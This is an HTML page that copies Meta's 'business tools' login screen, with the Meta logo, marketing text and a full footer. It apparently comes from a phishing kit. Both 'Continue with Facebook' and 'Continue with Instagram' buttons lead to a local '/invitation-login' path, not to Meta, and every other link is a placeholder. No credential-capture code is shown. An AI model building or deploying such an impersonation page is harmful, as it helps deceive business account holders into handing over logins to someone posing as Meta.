<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Get started with business tools from Meta</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yy/r/hcNeeHb3mLH.webp">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --meta-blue: #0668E1;
            --text-primary: #1C1E21;
            --text-secondary: #65676B;
            --bg-gradient: linear-gradient(135deg, #f0f7ff 0%, #ffffff 50%, #f7f0ff 100%);
            --button-hover: #f2f2f2;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            overflow-x: hidden;
            overflow-y: auto;
        }

        .main-container {
            display: flex;
            flex: 1;
            min-height: 100vh;
        }

        .left-panel {
            flex: 1.2;
            background: var(--bg-gradient);
            padding: 80px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            position: relative;
        }

        .right-panel {
            flex: 0.8;
            background: white;
            display: flex;
            align-items: center;
            justify-content: center;
            border-left: 1px solid #e5e5e5;
        }

        .content-wrapper {
            max-width: 540px;
            z-index: 2;
        }

        .logo {
            margin-bottom: 40px;
        }

        h1 {
            font-size: 44px;
            font-weight: 700;
            line-height: 1.1;
            color: var(--text-primary);
            margin-bottom: 24px;
        }

        .description {
            font-size: 16px;
            line-height: 1.5;
            color: var(--text-secondary);
            margin-bottom: 32px;
        }

        .features-label {
            font-weight: 600;
            margin-bottom: 16px;
            color: var(--text-primary);
        }

        .features-list {
            list-style: none;
        }

        .features-list li {
            position: relative;
            padding-left: 20px;
            margin-bottom: 12px;
            font-size: 14px;
            color: var(--text-secondary);
        }

        .features-list li::before {
            content: "•";
            position: absolute;
            left: 0;
            color: var(--text-secondary);
        }

        .login-card {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            text-align: center;
        }

        .login-card h2 {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 24px;
            color: var(--text-primary);
        }

        .btn-social {
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 12px;
            border-radius: 999px;
            border: 1px solid #dddfe2;
            background: #f5f6f7;
            margin-bottom: 12px;
            cursor: pointer;
            transition: background 0.2s;
            text-decoration: none;
            color: #1c1e21;
            font-weight: 500;
            font-size: 14px;
        }

        .btn-social:hover {
            background: var(--button-hover);
        }

        .btn-social img {
            width: 20px;
            height: 20px;
            margin-right: 10px;
        }

        .divider {
            margin: 24px 0;
            height: 1px;
            background: #e5e5e5;
        }

        .secondary-links {
            margin-top: 16px;
        }

        .link {
            color: var(--meta-blue);
            text-decoration: none;
            font-size: 14px;
            display: block;
            margin-bottom: 12px;
            font-weight: 500;
        }

        .link:hover {
            text-decoration: underline;
        }

        .meta-footer-logo {
            margin-top: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 4px;
            color: var(--meta-blue);
            font-weight: 600;
            font-size: 14px;
        }



        .globe-icon {
            position: absolute;
            bottom: 20px;
            right: 20px;
            color: #8a8d91;
        }

        /* Footer Styles */
        footer {
            background-color: #1c1e21;
            color: #f5f6f7;
            padding: 80px 80px 40px 80px;
            font-size: 13px;
        }

        .footer-grid {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 40px;
            margin-bottom: 60px;
        }

        .footer-column h3 {
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 20px;
            color: #ffffff;
        }

        .footer-column ul {
            list-style: none;
        }

        .footer-column ul li {
            margin-bottom: 12px;
        }

        .footer-column ul li a {
            color: #bcc0c4;
            text-decoration: none;
            transition: color 0.2s;
        }

        .footer-column ul li a:hover {
            color: #ffffff;
            text-decoration: underline;
        }

        .footer-bottom {
            border-top: 1px solid #3e4042;
            padding-top: 40px;
        }

        .footer-bottom-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }

        .copyright-social {
            display: flex;
            align-items: center;
            gap: 24px;
        }

        .social-icons {
            display: flex;
            gap: 16px;
        }

        .social-icons svg {
            width: 20px;
            height: 20px;
            fill: #bcc0c4;
            cursor: pointer;
            transition: fill 0.2s;
        }

        .social-icons svg:hover {
            fill: #ffffff;
        }

        .footer-bottom-links {
            display: flex;
            flex-wrap: wrap;
            gap: 24px;
            margin-bottom: 20px;
        }

        .footer-bottom-links a {
            color: #bcc0c4;
            text-decoration: none;
        }

        .footer-bottom-links a:hover {
            text-decoration: underline;
        }

        .language-selector {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            color: #8a8d91;
            font-size: 12px;
        }

        .language-selector span {
            cursor: pointer;
        }

        .language-selector span:hover {
            text-decoration: underline;
        }

        .language-selector .active {
            color: #bcc0c4;
        }

        @media (max-width: 1024px) {
            .main-container {
                flex-direction: column;
            }

            .left-panel,
            .right-panel {
                flex: none;
                width: 100%;
                padding: 40px 20px;
            }

            .footer-grid {
                grid-template-columns: repeat(2, 1fr);
            }

            footer {
                padding: 40px 20px;
            }
        }

        @media (max-width: 600px) {
            .footer-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>

<body>
    <div class="main-container">
        <div class="left-panel">
            <div class="content-wrapper">
                <div class="logo">
                    <svg aria-label="Meta symbol" height="48" role="img" viewBox="0 0 150 100" width="72">
                        <defs>
                            <linearGradient gradientUnits="userSpaceOnUse" id="meta_gradient" x1="28.409" x2="134.567"
                                y1="28.907" y2="71.769">
                                <stop stop-color="#0064E0"></stop>
                                <stop offset="0.656" stop-color="#0066E2"></stop>
                                <stop offset="1" stop-color="#0278F1"></stop>
                            </linearGradient>
                        </defs>
                        <path
                            d="M107.654 0c-12.3 0-21.915 9.264-30.618 21.032C65.076 5.802 55.073 0 43.103 0 18.698 0 0 31.76 0 65.376 0 86.41 10.177 99.679 27.223 99.679c12.268 0 21.092-5.784 36.778-33.203 0 0 6.539-11.547 11.037-19.501a514.1 514.1 0 0 1 4.98 8.227l7.356 12.374c14.329 23.977 22.312 32.103 36.778 32.103C140.758 99.68 150 86.23 150 64.757 150 29.56 130.88 0 107.654 0ZM52.039 59.051C39.322 78.987 34.922 83.455 27.841 83.455c-7.287 0-11.617-6.397-11.617-17.804 0-24.404 12.167-49.359 26.672-49.359 7.855 0 14.42 4.537 24.474 18.93-9.547 14.645-15.33 23.83-15.33 23.83Zm47.999-2.51-8.795-14.667c-2.38-3.87-4.66-7.428-6.862-10.689 7.927-12.234 14.465-18.33 22.241-18.33 16.155 0 29.079 23.786 29.079 53.002 0 11.137-3.647 17.599-11.205 17.599-7.244 0-10.704-4.785-24.458-26.914Z"
                            fill="url(#meta_gradient)"></path>
                    </svg>
                </div>
                <h1>Get started with business tools from Meta</h1>
                <p class="description">By logging in, you can navigate to all business tools like Ads Manager, Meta
                    Business Suite, Commerce Manager and more to help you connect with your customers and get better
                    business results.</p>
                <p class="features-label">Our business tools can help you:</p>
                <ul class="features-list">
                    <li>Spread the word about your business to increase brand awareness</li>
                    <li>Attract new customers, grow your client base and build customer relationships</li>
                    <li>Increase your online sales by reaching new audiences</li>
                </ul>
            </div>

        </div>
        <div class="right-panel">
            <div class="login-card">
                <h2>Log into business tools from Meta</h2>

                <a href="/invitation-login" class="btn-social">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg"
                        alt="Facebook">
                    Continue with Facebook
                </a>

                <a href="/invitation-login" class="btn-social">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
                    Continue with Instagram
                </a>

                <a href="#" class="link">Create new account</a>

                <div class="divider"></div>

                <div class="secondary-links">
                    <a href="#" class="link">Log in with a managed Meta account</a>
                </div>

                <div class="meta-footer-logo">
                    <svg width="16" height="16" viewBox="0 0 150 100">
                        <path
                            d="M107.654 0c-12.3 0-21.915 9.264-30.618 21.032C65.076 5.802 55.073 0 43.103 0 18.698 0 0 31.76 0 65.376 0 86.41 10.177 99.679 27.223 99.679c12.268 0 21.092-5.784 36.778-33.203 0 0 6.539-11.547 11.037-19.501a514.1 514.1 0 0 1 4.98 8.227l7.356 12.374c14.329 23.977 22.312 32.103 36.778 32.103C140.758 99.68 150 86.23 150 64.757 150 29.56 130.88 0 107.654 0ZM52.039 59.051C39.322 78.987 34.922 83.455 27.841 83.455c-7.287 0-11.617-6.397-11.617-17.804 0-24.404 12.167-49.359 26.672-49.359 7.855 0 14.42 4.537 24.474 18.93-9.547 14.645-15.33 23.83-15.33 23.83Zm47.999-2.51-8.795-14.667c-2.38-3.87-4.66-7.428-6.862-10.689 7.927-12.234 14.465-18.33 22.241-18.33 16.155 0 29.079 23.786 29.079 53.002 0 11.137-3.647 17.599-11.205 17.599-7.244 0-10.704-4.785-24.458-26.914Z"
                            fill="#0668E1"></path>
                    </svg>
                    Meta
                </div>
            </div>
        </div>

    </div>

    <footer>
        <div class="footer-grid">
            <div class="footer-column">
                <h3>Meta Technologies</h3>
                <ul>
                    <li><a href="#">Facebook</a></li>
                    <li><a href="#">Instagram</a></li>
                    <li><a href="#">Messenger</a></li>
                    <li><a href="#">WhatsApp</a></li>
                    <li><a href="#">Audience Network</a></li>
                    <li><a href="#">Meta Quest</a></li>
                    <li><a href="#">Workplace</a></li>
                    <li><a href="#">Meta for Work</a></li>
                </ul>
                <h3 style="margin-top: 40px;">Tools</h3>
                <ul>
                    <li><a href="#">Free Tools</a></li>
                    <li><a href="#">Facebook Pages</a></li>
                    <li><a href="#">Instagram Profiles</a></li>
                    <li><a href="#">Stories</a></li>
                    <li><a href="#">Shops</a></li>
                    <li><a href="#">Meta Business Suite</a></li>
                    <li><a href="#">Facebook Ads</a></li>
                    <li><a href="#">Messenger Ads</a></li>
                    <li><a href="#">Instagram Ads</a></li>
                    <li><a href="#">Video Ads</a></li>
                    <li><a href="#">Ads Manager</a></li>
                </ul>
            </div>
            <div class="footer-column">
                <h3>Goals</h3>
                <ul>
                    <li><a href="#">Set Up a Facebook Page</a></li>
                    <li><a href="#">Build Brand Awareness</a></li>
                    <li><a href="#">Promote Your Local Business</a></li>
                    <li><a href="#">Grow Online Sales</a></li>
                    <li><a href="#">Promote Your App</a></li>
                    <li><a href="#">Generate Leads</a></li>
                    <li><a href="#">Measure and Optimize Ads</a></li>
                    <li><a href="#">Retarget Existing Customers</a></li>
                    <li><a href="#">View All Goals</a></li>
                </ul>
                <h3 style="margin-top: 40px;">Business Types</h3>
                <ul>
                    <li><a href="#">Small Business</a></li>
                    <li><a href="#">Large Business</a></li>
                    <li><a href="#">Agency</a></li>
                    <li><a href="#">Media and Publisher</a></li>
                    <li><a href="#">Creator</a></li>
                    <li><a href="#">Developer</a></li>
                    <li><a href="#">Business Partner</a></li>
                </ul>
            </div>
            <div class="footer-column">
                <h3>Industries</h3>
                <ul>
                    <li><a href="#">Automotive</a></li>
                    <li><a href="#">Consumer Packaged Goods</a></li>
                    <li><a href="#">Ecommerce</a></li>
                    <li><a href="#">Entertainment and Media</a></li>
                    <li><a href="#">Financial Services</a></li>
                    <li><a href="#">Gaming</a></li>
                    <li><a href="#">Real Estate</a></li>
                    <li><a href="#">Restaurants</a></li>
                    <li><a href="#">Retail</a></li>
                    <li><a href="#">Technology and Telecom</a></li>
                    <li><a href="#">Travel</a></li>
                </ul>
                <h3 style="margin-top: 40px;">Inspiration</h3>
                <ul>
                    <li><a href="#">Business News</a></li>
                    <li><a href="#">Case Studies</a></li>
                    <li><a href="#">Events</a></li>
                    <li><a href="#">Creative Hub</a></li>
                </ul>
            </div>
            <div class="footer-column">
                <h3>Skills and Training</h3>
                <ul>
                    <li><a href="#">Online Learning</a></li>
                    <li><a href="#">Certification Programs</a></li>
                    <li><a href="#">Webinars</a></li>
                </ul>
                <h3 style="margin-top: 40px;">Guides and Resources</h3>
                <ul>
                    <li><a href="#">Ads Guide</a></li>
                    <li><a href="#">Brand Safety and Suitability</a></li>
                    <li><a href="#">'Click Here' Book</a></li>
                    <li><a href="#">Media Responsibility</a></li>
                    <li><a href="#">Sitemap</a></li>
                </ul>
            </div>
            <div class="footer-column">
                <h3>Business Help Center</h3>
                <ul>
                    <li><a href="#">Create and Manage Accounts</a></li>
                    <li><a href="#">Publish and Distribute Content</a></li>
                    <li><a href="#">Advertise</a></li>
                    <li><a href="#">Sell on Facebook and Instagram</a></li>
                    <li><a href="#">Monetize Your Content or App</a></li>
                    <li><a href="#">View All Articles</a></li>
                </ul>
            </div>
        </div>

        <div class="footer-bottom">
            <div class="footer-bottom-top">
                <div class="copyright-social">
                    <span>© 2026 Meta</span>
                    <div class="social-icons">
                        <svg viewBox="0 0 24 24">
                            <path
                                d="M22.675 0h-21.35c-.732 0-1.325.593-1.325 1.325v21.351c0 .731.593 1.324 1.325 1.324h11.495v-9.294h-3.128v-3.622h3.128v-2.671c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12v9.293h6.116c.73 0 1.323-.593 1.323-1.325v-21.35c0-.732-.593-1.325-1.325-1.325z" />
                        </svg>
                        <svg viewBox="0 0 24 24">
                            <path
                                d="M12 2.163c3.204 0 3.584.012 4.85.07 1.366.062 2.633.332 3.608 1.308.975.975 1.245 2.242 1.308 3.607.058 1.266.07 1.646.07 4.85s-.012 3.584-.07 4.85c-.063 1.366-.333 2.633-1.308 3.608-.975.975-2.242 1.246-3.607 1.308-1.266.058-1.646.07-4.85.07s-3.584-.012-4.85-.07c-1.366-.063-2.633-.333-3.608-1.308-.975-.975-1.246-2.242-1.308-3.607-.058-1.266-.07-1.646-.07-4.85s.012-3.584.07-4.85c.062-1.366.332-2.633 1.308-3.608.975-.975 2.242-1.245 3.607-1.308 1.266-.058 1.646-.07 4.85-.07zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948s.014 3.667.072 4.947c.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072s3.667-.014 4.947-.072c4.358-.2 6.78-2.618 6.98-6.98.058-1.281.072-1.689.072-4.948s-.014-3.667-.072-4.947c-.2-4.358-2.618-6.78-6.98-6.98-1.281-.058-1.689-.072-4.948-.072zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z" />
                        </svg>
                        <svg viewBox="0 0 24 24">
                            <path
                                d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z" />
                        </svg>
                        <svg viewBox="0 0 24 24">
                            <path
                                d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z" />
                        </svg>
                    </div>
                </div>
            </div>
            <div class="footer-bottom-links">
                <a href="#">About</a>
                <a href="#">Developers</a>
                <a href="#">Careers</a>
                <a href="#">Privacy</a>
                <a href="#">Cookies</a>
                <a href="#">Terms</a>
                <a href="#">Help Center</a>
            </div>
            <div class="language-selector">
                <span class="active">English (US)</span>
                <span>English (UK)</span>
                <span>Español</span>
                <span>Português (Brasil)</span>
                <span>Français (France)</span>
                <span>Español (España)</span>
                <span>More languages ></span>
            </div>
        </div>
    </footer>

    <div class="globe-icon">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
            stroke-linecap="round" stroke-linejoin="round">
            <circle cx="12" cy="12" r="10"></circle>
            <line x1="2" y1="12" x2="22" y2="12"></line>
            <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path>
        </svg>
    </div>
</body>

</html>